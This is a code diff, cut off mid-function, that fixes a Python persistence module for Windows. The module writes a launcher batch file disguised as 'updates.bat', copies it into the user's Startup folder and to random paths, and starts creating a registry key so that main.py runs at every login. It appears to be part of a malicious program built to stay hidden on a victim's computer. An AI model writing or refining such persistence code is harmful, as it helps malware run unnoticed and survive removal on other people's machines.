@@ -3,11 +3,12 @@ from random import random
 import shutil
 import winreg
 import os
-from func import generate_random_path
+from features.func import generate_random_path
 
 current_user = os.getenv("USERNAME")
 cwd = os.getcwd() + "/updates.bat"
-startup_path = f"C:/Users/{current_user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/updates.bat"
+startup_path = f"C:/Users/{current_user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+file_path = f"{startup_path}/updates.bat"
 
 def persist():
     if not __sanity():
@@ -18,27 +19,26 @@ def persist():
 
 def __create_lunch_script():
     python_path = f"C:/Users/{current_user}/AppData/Local/Programs/Python/Python39/python.exe"
-    main_path = f"{cwd}/main.py"
+    main_path = f"{os.getcwd()}/main.py"
 
     content = f"@echo off \n{python_path} {main_path} \npause"
-    with open("updates.bat", "a+") as f:
+    with open("updates.bat", "w+") as f:
         f.write(content)
 
 
 def __sanity():
-    return os.path.exists(startup_path)
+    return os.path.exists(file_path)
 
 
 def __copy_to_startup():
     try:
-        shutil.copyfile(cwd, startup_path)
+        shutil.copyfile(cwd, file_path)
     except shutil.SameFileError: # in case file already exists
         pass
 
 
 def __create_registry_key():
     trigger_path = generate_random_path()
-    print(trigger_path)
     shutil.copy(cwd, trigger_path + "updates.bat")
 
     try:
